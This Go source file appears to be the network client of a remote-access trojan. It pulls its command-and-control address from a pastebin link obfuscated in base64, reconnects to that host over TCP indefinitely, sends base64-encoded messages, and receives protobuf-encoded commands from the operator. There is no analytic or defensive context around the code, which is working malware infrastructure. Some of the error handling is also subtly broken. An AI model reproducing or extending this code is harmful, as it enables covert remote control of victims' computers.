package main

import (
	"bufio"
	"io/ioutil"
	"net"
	"strings"
	"net/http"
	"fmt"
	"../protoTiked"
	"github.com/golang/protobuf/proto"
	"log"
)

var c net.Conn //Global variable to send and receive from anywhere
var ip string

func Connect() (net.Conn, error) {
	ip = GetIp()
	_, err := net.Dial("tcp", ip)
	if err != nil {
		Wait()
		Connect()
	}
	return net.Dial("tcp", ip)
}

func GetIp() string { 
	resp, _ := http.Get(Base64Decode("aHR0cDovL3Bhc3RlYmluLmNvbS9yYXcvQnVHOTdCU2s="))
	defer resp.Body.Close()
	respBody, _ := ioutil.ReadAll(resp.Body)

	return strings.TrimLeft(string(respBody), "tcp://")
}

func Send(pre string, msg string) {
	c.Write([]byte(Base64Encode(pre + "|||" + msg))) //var c is located in client.go
}
func Receive() string {
	status, err := bufio.NewReader(c).ReadString('\n')
	if err != nil {
		c, _ = Connect()
	}
	fmt.Println("recived")
	return status
}


func ReceiveProto() protoTiked.Message  {
	data, err, _ := bufio.NewReader(c).ReadLine()
	res := &protoTiked.Message{}

	err2 := proto.Unmarshal([]byte(data), res)
	if err2 != nil {
		log.Fatal("unmarshaling error: ", err)
	}
	fmt.Println(res.GetCmd())
	return *res
}